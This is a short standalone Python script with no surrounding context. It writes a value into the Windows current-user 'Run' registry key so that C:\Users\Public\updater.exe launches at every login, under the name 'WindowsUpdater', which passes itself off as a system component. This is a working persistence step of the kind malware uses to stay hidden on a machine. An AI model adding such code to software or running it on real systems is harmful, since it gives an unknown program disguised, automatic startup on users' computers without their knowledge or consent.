import winreg
key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_SET_VALUE)
winreg.SetValueEx(key, 'WindowsUpdater', 0, winreg.REG_SZ, 'C:\\Users\\Public\\updater.exe')
winreg.CloseKey(key)